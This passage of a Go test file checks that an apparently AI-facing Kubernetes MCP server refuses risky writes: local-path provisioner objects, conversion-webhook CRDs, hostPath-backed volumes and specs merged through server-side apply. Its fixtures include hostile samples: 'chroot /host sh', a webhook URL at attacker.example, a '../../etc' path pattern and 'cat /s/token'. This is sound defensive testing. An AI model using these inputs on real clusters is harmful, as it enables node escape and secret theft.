				"metadata": map[string]any{"name": name, "namespace": "kube-system"},
				"data":     map[string]any{"inventory": `{"nodes":{}}`},
			}})
			if !strings.Contains(msg, "fixed policy") {
				t.Errorf("error %q does not say this is policy rather than a tier", msg)
			}
		})
		t.Run("delete "+name, func(t *testing.T) {
			msg := s.callExpectingError(t, "resource_delete", map[string]any{
				"resource": "configmaps", "name": name, "namespace": "kube-system",
			})
			if !strings.Contains(msg, "fixed policy") {
				t.Errorf("error %q does not say this is policy rather than a tier", msg)
			}
		})
	}

	t.Run("the same name outside kube-system is an ordinary ConfigMap", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "ConfigMap",
			"metadata": map[string]any{"name": "stratum-addon-inventory", "namespace": s.namespace},
		}}, &out)
		if out.Namespace != s.namespace {
			t.Errorf("applied into %q, want %q", out.Namespace, s.namespace)
		}
	})
}

// The local-path provisioner runs a helper pod on the node, with a node
// directory mounted, for every volume, and what that pod runs comes from the
// objects in its namespace and from a storage class's parameters. None of them
// is writable even with both flags, and the refusal comes before the API
// server is asked, so the objects are left as they were.
func TestLocalPathProvisioningIsNotWritableAtAnyTier(t *testing.T) {
	s := newWriteSession(t, true, true)
	const ns = "local-path-storage"
	refusal := "objects in namespace local-path-storage are not writable through this server (the " +
		"local-path provisioner there runs a pod on the node, with a node directory mounted, for every " +
		"volume, and these objects choose what that pod runs). This is a fixed policy, not a permission " +
		"that can be granted by a flag: make the change with kubectl"

	if _, err := s.typed.CoreV1().Namespaces().Create(t.Context(), &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{Name: ns},
	}, metav1.CreateOptions{}); err != nil && !errors.IsAlreadyExists(err) {
		t.Fatalf("create namespace: %v", err)
	}
	if _, err := s.typed.CoreV1().ConfigMaps(ns).Create(t.Context(), &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{Name: "local-path-config", Namespace: ns},
		Data:       map[string]string{"setup": "mkdir -m 0777 -p \"$VOL_DIR\""},
	}, metav1.CreateOptions{}); err != nil {
		t.Fatalf("create configmap: %v", err)
	}
	one := int32(1)
	if _, err := s.typed.AppsV1().Deployments(ns).Create(t.Context(), &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{Name: "local-path-provisioner", Namespace: ns},
		Spec: appsv1.DeploymentSpec{
			Replicas: &one,
			Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": "local-path-provisioner"}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": "local-path-provisioner"}},
				Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "c", Image: "busybox"}}},
			},
		},
	}, metav1.CreateOptions{}); err != nil {
		t.Fatalf("create deployment: %v", err)
	}

	for _, tc := range []struct {
		name string
		tool string
		args map[string]any
	}{
		{"apply the helper's ConfigMap", "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "ConfigMap",
			"metadata": map[string]any{"name": "local-path-config", "namespace": ns},
			"data":     map[string]any{"setup": "chroot /host sh"},
		}}},
		{"apply the provisioner's Deployment", "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "Deployment",
			"metadata": map[string]any{"name": "local-path-provisioner", "namespace": ns},
			"spec": map[string]any{
				"selector": map[string]any{"matchLabels": map[string]any{"app": "local-path-provisioner"}},
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "local-path-provisioner"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "other"}}},
				},
			},
		}}},
		{"apply a new ConfigMap there", "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "ConfigMap",
			"metadata": map[string]any{"name": "other-config", "namespace": ns},
		}}},
		{"delete the helper's ConfigMap", "resource_delete", map[string]any{
			"resource": "configmaps", "name": "local-path-config", "namespace": ns,
		}},
		{"scale the provisioner", "resource_scale", map[string]any{
			"resource": "deploy", "name": "local-path-provisioner", "namespace": ns, "replicas": 0,
		}},
	} {
		t.Run(tc.name+" is refused", func(t *testing.T) {
			if msg := s.callExpectingError(t, tc.tool, tc.args); !strings.Contains(msg, refusal) {
				t.Errorf("error %q, want the whole refusal %q", msg, refusal)
			}
		})
	}

	cm, err := s.typed.CoreV1().ConfigMaps(ns).Get(t.Context(), "local-path-config", metav1.GetOptions{})
	if err != nil || cm.Data["setup"] != "mkdir -m 0777 -p \"$VOL_DIR\"" {
		t.Errorf("local-path-config = %v, %v; want it unchanged", cm, err)
	}
	if _, err := s.typed.CoreV1().ConfigMaps(ns).Get(t.Context(), "other-config", metav1.GetOptions{}); !errors.IsNotFound(err) {
		t.Errorf("other-config: %v, want NotFound", err)
	}
	dep, err := s.typed.AppsV1().Deployments(ns).Get(t.Context(), "local-path-provisioner", metav1.GetOptions{})
	if err != nil || dep.Spec.Replicas == nil || *dep.Spec.Replicas != 1 || dep.Spec.Template.Spec.Containers[0].Image != "busybox" {
		t.Errorf("local-path-provisioner = %v, %v; want it unchanged", dep, err)
	}

	// pathPattern with allowUnsafePathPattern puts a volume anywhere on the node.
	t.Run("apply a storage class is refused", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "storage.k8s.io/v1", "kind": "StorageClass",
			"metadata":    map[string]any{"name": "anywhere"},
			"provisioner": "rancher.io/local-path",
			"parameters":  map[string]any{"pathPattern": "../../etc", "allowUnsafePathPattern": "true"},
		}})
		if !strings.Contains(msg, "local-path can be told to make them anywhere") || !strings.Contains(msg, "fixed policy") {
			t.Errorf("error %q does not give the storage-class reason and the policy", msg)
		}
		if _, err := s.typed.StorageV1().StorageClasses().Get(t.Context(), "anywhere", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Errorf("StorageClass anywhere: %v, want NotFound", err)
		}
	})

	// A cluster-scoped object lives in no namespace, so naming this one as
	// the namespace argument does not put it there.
	t.Run("a cluster-scoped object given that namespace is applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"namespace": ns, "manifest": map[string]any{
			"apiVersion": "scheduling.k8s.io/v1", "kind": "PriorityClass",
			"metadata": map[string]any{"name": "local-path-test-priority"},
			"value":    1000,
		}}, &out)
		if out.Name != "local-path-test-priority" {
			t.Errorf("out = %+v", out)
		}
	})

	t.Run("the same ConfigMap name in another namespace is an ordinary ConfigMap", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "ConfigMap",
			"metadata": map[string]any{"name": "local-path-config", "namespace": s.namespace},
		}}, &out)
		if out.Namespace != s.namespace {
			t.Errorf("applied into %q, want %q", out.Namespace, s.namespace)
		}
	})
}

// TestNodeWritesAreRefusedButDeletesAreOnlyGated.
func TestNodeWritesAreRefusedButDeletesAreOnlyGated(t *testing.T) {
	t.Run("apply is refused at every tier", func(t *testing.T) {
		s := newWriteSession(t, true, true)
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Node",
			"metadata": map[string]any{"name": "some-node"},
			"spec":     map[string]any{"taints": []any{}},
		}})
		if !strings.Contains(msg, "fixed policy") {
			t.Errorf("error %q does not say this is policy rather than a tier", msg)
		}
	})

	t.Run("delete still asks for the destructive flag rather than refusing outright", func(t *testing.T) {
		s := newWriteSession(t, true, false)
		msg := s.callExpectingError(t, "resource_delete", map[string]any{
			"resource": "nodes", "name": "some-node",
		})
		if !strings.Contains(msg, "--allow-destructive") {
			t.Errorf("error %q does not name the flag that would allow it", msg)
		}
	})
}

// TestConversionWebhookCRDsAreRefused.
func TestConversionWebhookCRDsAreRefused(t *testing.T) {
	s := newWriteSession(t, true, true)

	// spec.versions is required, or the API server rejects every one of
	// these as invalid and the negative case below proves nothing.
	crd := func(conversion map[string]any) map[string]any {
		spec := map[string]any{
			"group": "example.com",
			"names": map[string]any{"plural": "widgets", "singular": "widget", "kind": "Widget"},
			"scope": "Namespaced",
			"versions": []any{map[string]any{
				"name": "v1", "served": true, "storage": true,
				"schema": map[string]any{"openAPIV3Schema": map[string]any{
					"type": "object",
					"properties": map[string]any{
						"spec": map[string]any{"type": "object"},
					},
				}},
			}},
		}
		if conversion != nil {
			spec["conversion"] = conversion
		}
		return map[string]any{
			"apiVersion": "apiextensions.k8s.io/v1", "kind": "CustomResourceDefinition",
			"metadata": map[string]any{"name": "widgets.example.com"},
			"spec":     spec,
		}
	}

	msg := s.callExpectingError(t, "resource_apply", map[string]any{
		"manifest": crd(map[string]any{
			"strategy": "Webhook",
			"webhook": map[string]any{
				"clientConfig":             map[string]any{"url": "https://attacker.example/convert"},
				"conversionReviewVersions": []any{"v1"},
			},
		}),
	})
	if !strings.Contains(msg, "conversion") {
		t.Errorf("error %q does not say the conversion webhook is why", msg)
	}

	// A CRD with no conversion webhook is an ordinary install and must
	// still work, or the guard has taken the resource away entirely.
	// A success, not "the refusal did not mention conversion".
	t.Run("a CRD without one is applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{
			"manifest": crd(map[string]any{"strategy": "None"}),
		}, &out)
		if out.Name != "widgets.example.com" {
			t.Errorf("out = %+v", out)
		}
	})

	t.Run("and one with no conversion stanza at all", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": crd(nil)}, &out)
		if out.Name != "widgets.example.com" {
			t.Errorf("out = %+v", out)
		}
	})
	t.Run("existing conversion cannot be hidden by omitting the field", func(t *testing.T) {
		dc, err := dynamic.NewForConfig(kubetest.Start(t))
		if err != nil {
			t.Fatal(err)
		}
		ri := dc.Resource(schema.GroupVersionResource{Group: "apiextensions.k8s.io", Version: "v1", Resource: "customresourcedefinitions"})
		webhook := crd(map[string]any{"strategy": "Webhook", "webhook": map[string]any{
			"clientConfig": map[string]any{"url": "https://example.com/convert"}, "conversionReviewVersions": []any{"v1"},
		}})
		defer func() {
			_, err := ri.Apply(t.Context(), "widgets.example.com", &unstructured.Unstructured{Object: crd(map[string]any{"strategy": "None"})}, metav1.ApplyOptions{FieldManager: "external-manager", Force: true})
			if err != nil {
				t.Errorf("restore non-webhook CRD: %v", err)
			}
		}()
		// A different manager owns conversion; the MCP manifest omits it.
		if _, err := ri.Apply(t.Context(), "widgets.example.com", &unstructured.Unstructured{Object: webhook}, metav1.ApplyOptions{FieldManager: "external-manager", Force: true}); err != nil {
			t.Fatal(err)
		}
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": crd(nil), "force": true})
		if !strings.Contains(msg, "conversion") {
			t.Fatalf("expected conversion refusal: %s", msg)
		}
	})

}

func typedFor(t *testing.T, cfg *rest.Config) kubernetes.Interface {
	t.Helper()
	typed, err := kubernetes.NewForConfig(rest.CopyConfig(cfg))
	if err != nil {
		t.Fatalf("typed client: %v", err)
	}
	return typed
}

// TestNodePathStorageIsRefused covers the one route around the pod-spec
// hostPath guard that the PersistentVolume deny list does not close.
//
// deniedMutations refuses writing a PersistentVolume or a claim, so this
// server cannot create a node-path pair. It can still mount a pair an
// operator left behind, and that reaches the node's filesystem with no
// hostPath anywhere in the pod spec.
func TestNodePathStorageIsRefused(t *testing.T) {
	s := newWriteSession(t, true, true)

	t.Run("writing a PersistentVolume is refused outright", func(t *testing.T) {
		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "PersistentVolume",
			"metadata": map[string]any{"name": "np-nfs"},
			"spec": map[string]any{
				"capacity":    map[string]any{"storage": "1Gi"},
				"accessModes": []any{"ReadWriteOnce"},
				"nfs":         map[string]any{"server": "10.0.0.9", "path": "/exports"},
			},
		}})
		if !strings.Contains(msg, "persistentvolumes") {
			t.Errorf("error %q does not name the resource", msg)
		}
	})

	t.Run("a pod mounting a claim bound to a node path is refused", func(t *testing.T) {
		vol := s.createNodePathPV(t, "bound-hostpath")
		claim := s.createBoundClaim(t, "data", vol)

		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "reader", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
				"volumes": []any{map[string]any{
					"name": "d", "persistentVolumeClaim": map[string]any{"claimName": claim},
				}},
			},
		}})
		if !strings.Contains(msg, claim) || !strings.Contains(msg, "hostPath") {
			t.Errorf("error %q does not name the claim and what backs it", msg)
		}
	})

	// A claim bound to ordinary storage must still mount, or the guard has
	// taken persistent storage away rather than node paths.
	t.Run("a pod mounting a claim bound to network storage is applied", func(t *testing.T) {
		vol := s.createNFSPV(t, "bound-nfs")
		claim := s.createBoundClaim(t, "netdata", vol)

		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "net-reader", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
				"volumes": []any{map[string]any{
					"name": "d", "persistentVolumeClaim": map[string]any{"claimName": claim},
				}},
			},
		}}, &out)
		if out.Name != "net-reader" {
			t.Errorf("out = %+v", out)
		}
	})

	// A claim that does not exist yet is not a refusal: the pod cannot
	// start until it binds, and creating the claim is itself refused.
	t.Run("a pod mounting an absent claim is applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "pending", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
				"volumes": []any{map[string]any{
					"name": "d", "persistentVolumeClaim": map[string]any{"claimName": "not-created-yet"},
				}},
			},
		}}, &out)
		if out.Name != "pending" {
			t.Errorf("out = %+v", out)
		}
	})

	// A claim the cluster will create from a template is made after this
	// check, so the check is on what it could bind to among the PVs that
	// exist now. A class-less template matches a class-less node-path PV.
	t.Run("a StatefulSet whose claim template can bind a node-path volume is refused", func(t *testing.T) {
		s.createNodePathPV(t, "np-claims")

		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "StatefulSet",
			"metadata": map[string]any{"name": "web", "namespace": s.namespace},
			"spec": map[string]any{
				"selector":    map[string]any{"matchLabels": map[string]any{"app": "web"}},
				"serviceName": "web",
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "web"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "busybox"}}},
				},
				"volumeClaimTemplates": []any{map[string]any{
					"metadata": map[string]any{"name": "data"},
					"spec": map[string]any{
						"storageClassName": "",
						"accessModes":      []any{"ReadWriteOnce"},
						"resources":        map[string]any{"requests": map[string]any{"storage": "1Gi"}},
					},
				}},
			},
		}})
		if !strings.Contains(msg, "volumeClaimTemplates") || !strings.Contains(msg, "fixed policy") {
			t.Errorf("error %q does not name the template and the policy", msg)
		}
		if _, err := s.typed.AppsV1().StatefulSets(s.namespace).Get(t.Context(), "web", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Errorf("StatefulSet web: %v, want NotFound", err)
		}
	})

	// A set's pods re-adopt an existing <template>-<set>-<ordinal> claim by
	// name, so a claim that is already bound is what the new pods mount. The
	// provisioned class keeps the PV matching out of it: only the reuse of a
	// node-path-backed claim can refuse.
	t.Run("a StatefulSet whose template would reuse a claim bound to a node path is refused", func(t *testing.T) {
		vol := s.createNodePathPV(t, "np-reuse")
		s.createBoundClaim(t, "data-webhost-0", vol)

		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "StatefulSet",
			"metadata": map[string]any{"name": "webhost", "namespace": s.namespace},
			"spec": map[string]any{
				"selector":    map[string]any{"matchLabels": map[string]any{"app": "webhost"}},
				"serviceName": "webhost",
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "webhost"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "busybox"}}},
				},
				"volumeClaimTemplates": []any{map[string]any{
					"metadata": map[string]any{"name": "data"},
					"spec": map[string]any{
						"storageClassName": "local-path",
						"accessModes":      []any{"ReadWriteOnce"},
						"resources":        map[string]any{"requests": map[string]any{"storage": "1Gi"}},
					},
				}},
			},
		}})
		if !strings.Contains(msg, "data-webhost-0") || !strings.Contains(msg, "hostPath") {
			t.Errorf("error %q does not name the reused claim and what backs it", msg)
		}
		if _, err := s.typed.AppsV1().StatefulSets(s.namespace).Get(t.Context(), "webhost", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Errorf("StatefulSet webhost: %v, want NotFound", err)
		}
	})

	// The product-owner constraint in the other direction: a retained claim
	// the template's name could reach must keep applying when it is bound to
	// ordinary storage.
	t.Run("a StatefulSet whose template would reuse a claim bound to network storage is applied", func(t *testing.T) {
		vol := s.createNFSPV(t, "net-reuse")
		s.createBoundClaim(t, "data-webnet-0", vol)

		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "StatefulSet",
			"metadata": map[string]any{"name": "webnet", "namespace": s.namespace},
			"spec": map[string]any{
				"selector":    map[string]any{"matchLabels": map[string]any{"app": "webnet"}},
				"serviceName": "webnet",
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "webnet"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "busybox"}}},
				},
				"volumeClaimTemplates": []any{map[string]any{
					"metadata": map[string]any{"name": "data"},
					"spec": map[string]any{
						"storageClassName": "local-path",
						"accessModes":      []any{"ReadWriteOnce"},
						"resources":        map[string]any{"requests": map[string]any{"storage": "1Gi"}},
					},
				}},
			},
		}}, &out)
		if out.Name != "webnet" {
			t.Errorf("out = %+v", out)
		}
		if _, err := s.typed.AppsV1().StatefulSets(s.namespace).Get(t.Context(), "webnet", metav1.GetOptions{}); err != nil {
			t.Errorf("StatefulSet webnet was not stored: %v", err)
		}
	})

	// An ephemeral volume whose claim template pins a node-path PV is the
	// same route under a different name.
	t.Run("a pod whose ephemeral volume names a node-path volume is refused", func(t *testing.T) {
		nodePV := s.createNodePathPV(t, "np-ephemeral")

		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "v1", "kind": "Pod",
			"metadata": map[string]any{"name": "scratchy", "namespace": s.namespace},
			"spec": map[string]any{
				"containers": []any{map[string]any{"name": "c", "image": "busybox"}},
				"volumes": []any{map[string]any{
					"name":      "scratch",
					"ephemeral": map[string]any{"volumeClaimTemplate": map[string]any{"spec": map[string]any{"volumeName": nodePV}}},
				}},
			},
		}})
		if !strings.Contains(msg, "ephemeral volume") {
			t.Errorf("error %q does not name the ephemeral volume", msg)
		}
		if _, err := s.typed.CoreV1().Pods(s.namespace).Get(t.Context(), "scratchy", metav1.GetOptions{}); !errors.IsNotFound(err) {
			t.Errorf("Pod scratchy: %v, want NotFound", err)
		}
	})

	// The product-owner case: the default local-path provisioner makes
	// hostPath PVs for every claim it serves, so a template on a provisioned
	// class must keep applying. The explicit class matters here: an unset
	// class would match the class-less node-path PV above.
	t.Run("a StatefulSet on a provisioned class is applied", func(t *testing.T) {
		s.createNodePathPV(t, "np-provisioned")

		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "StatefulSet",
			"metadata": map[string]any{"name": "provisioned", "namespace": s.namespace},
			"spec": map[string]any{
				"selector":    map[string]any{"matchLabels": map[string]any{"app": "provisioned"}},
				"serviceName": "provisioned",
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "provisioned"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "busybox"}}},
				},
				"volumeClaimTemplates": []any{map[string]any{
					"metadata": map[string]any{"name": "data"},
					"spec": map[string]any{
						"storageClassName": "local-path",
						"accessModes":      []any{"ReadWriteOnce"},
						"resources":        map[string]any{"requests": map[string]any{"storage": "1Gi"}},
					},
				}},
			},
		}}, &out)
		if out.Name != "provisioned" {
			t.Errorf("out = %+v", out)
		}
		if _, err := s.typed.AppsV1().StatefulSets(s.namespace).Get(t.Context(), "provisioned", metav1.GetOptions{}); err != nil {
			t.Errorf("StatefulSet provisioned was not stored: %v", err)
		}
	})
}

// TestApplyChecksTheObjectAlreadyThere covers what server-side apply
// preserves. A field this manifest omits stays as another field manager
// left it, so checking only the manifest does not enforce the policy.
func TestApplyChecksTheObjectAlreadyThere(t *testing.T) {
	s := newWriteSession(t, true, true)

	// Created by another manager, carrying a volume this server refuses.
	deploy := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{Name: "legacy", Namespace: s.namespace},
		Spec: appsv1.DeploymentSpec{
			Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"app": "legacy"}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": "legacy"}},
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{{Name: "c", Image: "busybox"}},
					Volumes: []corev1.Volume{{
						Name:         "s",
						VolumeSource: corev1.VolumeSource{Secret: &corev1.SecretVolumeSource{SecretName: "any"}},
					}},
				},
			},
		},
	}
	if _, err := s.typed.AppsV1().Deployments(s.namespace).Create(
		t.Context(), deploy, metav1.CreateOptions{FieldManager: "someone-else"}); err != nil {
		t.Fatalf("seed deployment: %v", err)
	}

	// The manifest itself is clean and mentions no volumes at all. Under
	// SSA the secret volume survives, so this must still be refused.
	msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
		"apiVersion": "apps/v1", "kind": "Deployment",
		"metadata": map[string]any{"name": "legacy", "namespace": s.namespace},
		"spec": map[string]any{
			"selector": map[string]any{"matchLabels": map[string]any{"app": "legacy"}},
			"template": map[string]any{
				"metadata": map[string]any{"labels": map[string]any{"app": "legacy"}},
				"spec": map[string]any{"containers": []any{map[string]any{
					"name": "c", "image": "busybox",
					"command": []any{"sh", "-c", "cat /s/token"},
				}}},
			},
		},
	}})
	if !strings.Contains(msg, "secret volume") {
		t.Errorf("error %q does not say the retained secret volume is why", msg)
	}

	// A StatefulSet another manager created carries a volumeClaimTemplates
	// entry this manifest omits. SSA keeps it, so a scale-up apply that only
	// changes the image would still have the controller make new claims from
	// that template -- it must be refused while a node-path PV could take one.
	t.Run("a retained claim template on the stored object is refused", func(t *testing.T) {
		s.createNodePathPV(t, "np-retained")
		emptyClass := ""
		sts := &appsv1.StatefulSet{
			ObjectMeta: metav1.ObjectMeta{Name: "legacy-sts", Namespace: s.namespace},
			Spec: appsv1.StatefulSetSpec{
				Selector:    &metav1.LabelSelector{MatchLabels: map[string]string{"app": "legacy-sts"}},
				ServiceName: "legacy-sts",
				Template: corev1.PodTemplateSpec{
					ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"app": "legacy-sts"}},
					Spec: corev1.PodSpec{
						Containers: []corev1.Container{{Name: "c", Image: "busybox"}},
					},
				},
				VolumeClaimTemplates: []corev1.PersistentVolumeClaim{{
					ObjectMeta: metav1.ObjectMeta{Name: "data"},
					Spec: corev1.PersistentVolumeClaimSpec{
						AccessModes:      []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
						StorageClassName: &emptyClass,
						Resources: corev1.VolumeResourceRequirements{
							Requests: corev1.ResourceList{corev1.ResourceStorage: apiresource.MustParse("1Gi")},
						},
					},
				}},
			},
		}
		if _, err := s.typed.AppsV1().StatefulSets(s.namespace).Create(
			t.Context(), sts, metav1.CreateOptions{FieldManager: "someone-else"}); err != nil {
			t.Fatalf("seed statefulset: %v", err)
		}

		msg := s.callExpectingError(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "StatefulSet",
			"metadata": map[string]any{"name": "legacy-sts", "namespace": s.namespace},
			"spec": map[string]any{
				"selector":    map[string]any{"matchLabels": map[string]any{"app": "legacy-sts"}},
				"serviceName": "legacy-sts",
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "legacy-sts"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "nginx"}}},
				},
			},
		}})
		if !strings.Contains(msg, "volumeClaimTemplates") {
			t.Errorf("error %q does not say the retained claim template is why", msg)
		}
	})

	// A deployment with nothing to retain still applies.
	t.Run("an object with no protected field is applied", func(t *testing.T) {
		var out mcpsrv.ResourceApplyOut
		s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
			"apiVersion": "apps/v1", "kind": "Deployment",
			"metadata": map[string]any{"name": "clean", "namespace": s.namespace},
			"spec": map[string]any{
				"selector": map[string]any{"matchLabels": map[string]any{"app": "clean"}},
				"template": map[string]any{
					"metadata": map[string]any{"labels": map[string]any{"app": "clean"}},
					"spec":     map[string]any{"containers": []any{map[string]any{"name": "c", "image": "busybox"}}},
				},
			},
		}}, &out)
		if out.Name != "clean" {
			t.Errorf("out = %+v", out)
		}
	})
}

func (s *k8sSession) createNodePathPV(t *testing.T, name string) string {
	t.Helper()
	return s.createPV(t, name, corev1.PersistentVolumeSource{
		HostPath: &corev1.HostPathVolumeSource{Path: "/"},
	})
}

func (s *k8sSession) createNFSPV(t *testing.T, name string) string {
	t.Helper()
	return s.createPV(t, name, corev1.PersistentVolumeSource{
		NFS: &corev1.NFSVolumeSource{Server: "10.0.0.9", Path: "/exports"},
	})
}

func (s *k8sSession) createPV(t *testing.T, name string, source corev1.PersistentVolumeSource) string {
	t.Helper()
	pv := &corev1.PersistentVolume{
		ObjectMeta: metav1.ObjectMeta{Name: name},
		Spec: corev1.PersistentVolumeSpec{
			Capacity:               corev1.ResourceList{corev1.ResourceStorage: apiresource.MustParse("1Gi")},
			AccessModes:            []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
			PersistentVolumeSource: source,
		},
	}
	if _, err := s.typed.CoreV1().PersistentVolumes().Create(t.Context(), pv, metav1.CreateOptions{}); err != nil {
		t.Fatalf("create pv %s: %v", name, err)
	}
	t.Cleanup(func() {
		_ = s.typed.CoreV1().PersistentVolumes().Delete(context.Background(), name, metav1.DeleteOptions{})
	})
	return name
}

func (s *k8sSession) createBoundClaim(t *testing.T, name, volume string) string {
	t.Helper()
	claim := &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: s.namespace},
		Spec: corev1.PersistentVolumeClaimSpec{
			AccessModes: []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
			VolumeName:  volume,
			Resources: corev1.VolumeResourceRequirements{
				Requests: corev1.ResourceList{corev1.ResourceStorage: apiresource.MustParse("1Gi")},
			},
		},
	}
	if _, err := s.typed.CoreV1().PersistentVolumeClaims(s.namespace).Create(
		t.Context(), claim, metav1.CreateOptions{}); err != nil {
		t.Fatalf("create pvc %s: %v", name, err)
	}
	return name
}

// TestACRDAppliedHereIsThenAddressable is the end-to-end case for the
// discovery refresh.
//
// Discovery is cached for the life of the process, and resource_apply
// resolves the CRD's own kind through the mapper first, so the cache is
// already warm and predates the new kind. Without a refresh on a miss,
// this server can install a CustomResourceDefinition and then be unable
// to address it for the rest of the session, reporting "unknown
// resource" as though the CRD had never been applied.
func TestACRDAppliedHereIsThenAddressable(t *testing.T) {
	s := newWriteSession(t, true, true)

	// Warm the cache before the kind exists, which is what makes the
	// miss possible. Any resolve through the mapper does it.
	var before mcpsrv.ResourceListOut
	s.call(t, "resource_list", map[string]any{"resource": "configmaps", "namespace": s.namespace}, &before)

	var applied mcpsrv.ResourceApplyOut
	s.call(t, "resource_apply", map[string]any{"manifest": map[string]any{
		"apiVersion": "apiextensions.k8s.io/v1", "kind": "CustomResourceDefinition",
		"metadata": map[string]any{"name": "sprockets.example.com"},
		"spec": map[string]any{
			"group": "example.com",
			"names": map[string]any{"plural": "sprockets", "singular": "sprocket", "kind": "Sprocket"},
			"scope": "Namespaced",
			"versions": []any{map[string]any{
				"name": "v1", "served": true, "storage": true,
				"schema": map[string]any{"openAPIV3Schema": map[string]any{
					"type":       "object",
					"properties": map[string]any{"spec": map[string]any{"type": "object"}},
				}},
			}},
		},
	}}, &applied)
	if applied.Name != "sprockets.example.com" {
		t.Fatalf("apply = %+v", applied)
	}

	// Wait for the API server itself to serve the new resource. That is
	// a different question from whether our cached discovery knows about
	// it, which is what the call below actually tests.
	waitForServedResource(t, s.typed, "example.com/v1", "sprockets")

	var out mcpsrv.ResourceListOut
	s.call(t, "resource_list", map[string]any{"resource": "sprockets", "namespace": s.namespace}, &out)
	if out.Count != 0 {
		t.Errorf("expected an empty list of a kind just created, got %+v", out)
	}
}

func waitForServedResource(t *testing.T, typed kubernetes.Interface, groupVersion, plural string) {
	t.Helper()
	deadline := time.Now().Add(30 * time.Second)
	for {
		list, err := typed.Discovery().ServerResourcesForGroupVersion(groupVersion)
		if err == nil {
			for _, r := range list.APIResources {
				if r.Name == plural {
					return
				}
			}
		}
		if time.Now().After(deadline) {
			t.Fatalf("the API server never served %s in %s: %v", plural, groupVersion, err)
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// Server-side apply can build a pod spec out of fields that neither the
// manifest nor the existing object holds alone: another manager's hostPID,
// with no containers beside it, and this manifest's containers. The object the
// apply would produce is what gets checked.
func TestApplyRefusesAPodSpecAssembledAcrossManagers(t *testing.T) {
	s := newWriteSession(t, true, true)
